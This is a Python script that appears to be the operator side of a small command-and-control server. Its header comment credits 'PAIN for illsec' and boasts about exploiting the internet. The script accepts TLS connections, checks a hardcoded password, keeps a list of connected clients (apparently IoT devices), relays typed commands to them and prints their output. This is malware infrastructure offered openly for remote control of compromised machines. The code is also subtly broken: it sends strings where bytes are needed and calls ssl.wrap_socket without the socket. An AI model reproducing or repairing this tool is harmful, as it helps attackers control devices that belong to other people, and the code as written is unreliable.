# made by PAIN for illsec to fuck crontabs

#this project was made off the idea that the internet was made to be exploited this shows the power on person can have when he is persistent 
import socket, ssl, threading 

bind_ip = "127.0.0.1" # host to bind socket to 
bind_port = 34267 # port to bind socket to 
server_cert = "server.crt" # cert file to wuth with from server 
server_key = "server.key" # file that contains the key to ack server 
password = b"password" # password that has to be in server.key from the client to connect with 

clients = {} # creating a open statement to handle clients

def handle_client(client_socket, client_address):#handle client connection and give id to execute commands 
    client_socket.send("passwd: ")
    client_password = client_socket.recv(1024)
    if client_password != password:
        client_socket.send(b"\r\rerror 204\r\r\nno backlog today ")
        client_socket.close()
        return
    
    client_socket.send("hello")
    client_id = client_address[0] + ":" + str(client_address[1])
    clients[client_id] = client_address

    while True:
            client_socket.send(b"(exit) to leave | command: ") #
            command = input()
            if command == "exit":
                break
            client_socket.send(command.encode())
            output= client_socket.recv(1024)
            print(output.decode())

    del clients[client_id]
    client_socket.close()

def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((bind_ip, bind_port))
    server.listen(5)
    print("[*] List of iot %s:%d" % (bind_ip, bind_port))

    while True:
        client_socket, addr = server.accept()
        print("[*] active conn from: %s:%d" % (addr[0],addr[1]))
        client_socket = ssl.wrap_socket(
            server_side=True,
            certfile=server_cert,
            keyfile=server_key)
        client_handler = threading.Thread(target=handle_client, args=(client_socket, addr))
        client_handler.start()

if __name__ == "__main__":
    main()

        